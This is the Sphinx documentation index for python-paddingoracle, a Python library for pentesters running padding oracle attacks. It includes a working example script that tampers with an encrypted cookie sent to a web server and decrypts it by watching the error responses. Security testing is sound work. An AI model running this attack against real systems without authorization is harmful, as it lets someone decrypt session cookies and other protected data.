.. Padding Oracle Exploit API documentation master file, created by
   sphinx-quickstart on Tue Jan  8 14:35:03 2013.
   You can adapt this file completely to your liking, but it should at least
   contain the root `toctree` directive.

Padding Oracle Exploit API
==========================

python-paddingoracle is an API that provides pentesters a customizable
alternative to `PadBuster`_ and other padding oracle exploit tools that can't
easily (without a heavy rewrite) be used in unique, per-app scenarios. Think
non-HTTP applications, raw sockets, client applications, unique encodings, etc.


Usage
-----

.. module:: paddingoracle

To use the paddingoracle API, simply implement the :meth:`~PaddingOracle.oracle`
method from the :class:`PaddingOracle` API and raise a :exc:`BadPaddingException`
when the decrypter reveals a padding oracle. To decrypt data, pass raw encrypted
bytes to :meth:`~PaddingOracle.decrypt` with a **block_size** (typically 8 or 16)
and optional **iv** parameter.

See below for an example (from `the example`_): ::

    from paddingoracle import BadPaddingException, PaddingOracle
    from base64 import b64encode, b64decode
    from urllib import quote, unquote
    import requests
    import socket
    import time

    class PadBuster(PaddingOracle):
        def __init__(self, **kwargs):
            super(PadBuster, self).__init__(**kwargs)
            self.session = requests.Session()
            self.wait = kwargs.get('wait', 2.0)

        def oracle(self, data, **kwargs):
            somecookie = quote(b64encode(data))
            self.session.cookies['somecookie'] = somecookie

            while 1:
                try:
                    response = self.session.get('http://www.example.com/',
                            stream=False, timeout=5, verify=False)
                    break
                except (socket.error, requests.exceptions.RequestException):
                    logging.exception('Retrying request in %.2f seconds...',
                                      self.wait)
                    time.sleep(self.wait)
                    continue

            self.history.append(response)

            if response.ok:
                logging.debug('No padding exception raised on %r', somecookie)
                return

            # An HTTP 500 error was returned, likely due to incorrect padding
            raise BadPaddingException

    if __name__ == '__main__':
        import logging
        import sys

        if not sys.argv[1:]:
            print 'Usage: %s <somecookie value>' % (sys.argv[0], )
            sys.exit(1)

        logging.basicConfig(level=logging.DEBUG)

        encrypted_cookie = b64decode(unquote(sys.argv[1]))

        padbuster = PadBuster()

        cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))

        print('Decrypted somecookie: %s => %r' % (sys.argv[1], cookie))


API Documentation
-----------------

.. toctree::
    :maxdepth: 2

    api


Credits
-------

python-paddingoracle is a Python implementation heavily based on `PadBuster`_,
an automated script for performing Padding Oracle attacks, developed by
Brian Holyfield of Gotham Digital Science.

.. _`the example`: https://github.com/mwielgoszewski/python-paddingoracle/blob/master/example.py
.. _`PadBuster`: https://github.com/GDSSecurity/PadBuster
